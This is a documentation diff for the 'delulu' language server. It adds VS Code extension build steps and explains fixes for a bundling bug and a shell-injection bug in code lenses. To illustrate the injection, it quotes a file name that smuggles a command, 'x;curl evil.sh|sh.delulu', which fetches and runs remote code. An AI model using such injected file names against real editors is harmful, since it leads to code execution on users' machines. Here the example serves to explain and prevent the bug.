@@ -46,7 +46,8 @@ transport: stdio
   server reads the whole project and writes only what you can see.
 - **Semantic tokens** with dedicated kinds for effects, reference capabilities,
   capability types, and secrets.
-- **Code lenses** on `fn main` (`▶ run`, `authority: {…}`) and every `test` block.
+- **Code lenses** on `fn main` (`▶ run`, `authority: {…}`) and every `test` block (`▶ run test`,
+  which runs *that* test by name — it used to run the whole file).
 - **`delulu.authority`** (workspace/executeCommand) — the §10.5 authority report as
   JSON over the wire; agent harnesses call this instead of shelling out.
 - **Signature help** — while writing a call, the callee's parameters *and its
@@ -73,9 +74,33 @@ availability is not a security property (spec §11).
 
 ## Per-editor notes
 
-- **VS Code:** the in-repo extension skeleton is `editors/vscode/` (LSP client +
-  TextMate grammar). `npm install && code --install-extension` after packaging, or use
-  it as the template for a marketplace build.
+- **VS Code:** the extension lives in `editors/vscode/` (LSP client + TextMate grammar). Build and
+  install it with:
+
+  ```
+  cd editors/vscode
+  npm install
+  npm run package     # esbuild bundle -> delulu-lang.vsix
+  npm run verify      # refuses a .vsix that would fail to activate
+  code --install-extension delulu-lang.vsix
+  ```
+
+  It requires `delulu` on your `PATH`; set `delulu.serverPath` if it is elsewhere.
+
+  **It is bundled into one file on purpose.** Shipping the dependency tree instead produced a `.vsix`
+  that packaged cleanly and would have thrown `Cannot find module` on activation: `npm install` put 8
+  packages in `node_modules` and `vsce` shipped only the one named in `dependencies`, so three
+  transitive requires travelled nowhere. `npm run verify` is what catches that — it unpacks the built
+  archive and checks every `require` in every shipped file resolves, because a green *package* step
+  says nothing about whether the thing inside runs.
+
+  **Commands run with an argument vector, never a shell string.** The lenses previously built
+  `` `${serverPath} run ${fsPath}` `` and handed it to the user's shell, so a file named
+  `x;curl evil.sh|sh.delulu` executed on click and any path with a space ran the wrong command.
+  `crates/delulu/tests/editor_contract.rs` fails the build if that shape returns, and if the three
+  lists — commands the server emits, commands the client registers, commands the manifest declares —
+  ever disagree. They had disagreed since Stage 8: `delulu.authority` was emitted by the server and
+  registered by nobody, so clicking that lens raised *"command not found"* for the life of the feature.
 - **Zed / Helix / Neovim (lspconfig) / Kate / Emacs (eglot):** point the editor's LSP
   config at `delulu lsp` for `*.delulu` — the three-line config above is all of it.
 - **JetBrains:** via the native LSP support (2023.2+) or the LSP4IJ plugin; same command.
